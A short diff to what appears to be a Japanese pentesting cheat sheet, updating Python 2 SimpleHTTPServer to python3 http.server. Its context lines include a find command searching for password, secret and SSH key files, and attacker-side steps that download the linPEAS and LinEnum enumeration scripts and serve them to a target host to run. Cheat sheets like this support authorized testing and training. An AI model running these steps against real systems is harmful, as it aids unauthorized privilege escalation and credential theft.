@@ -452,7 +452,7 @@ find /  -iname "*pwd*" -or -iname "*pass*" -or -iname "*secret*" -or -name "id_r
 # 攻撃者側
 cd /var/tmp
 wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
-python -m SimpleHTTPServer [MyHostPort]
+python3 -m http.server [MyHostPort]
 
 # ターゲット側 
 cd /var/tmp
@@ -467,7 +467,7 @@ chmod +x linpeas.sh
 # 攻撃者側
 cd /var/tmp
 wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-python -m SimpleHTTPServer [MyHostPort]
+python3 -m http.server [MyHostPort]
 
 # ターゲット側
 cd /var/tmp
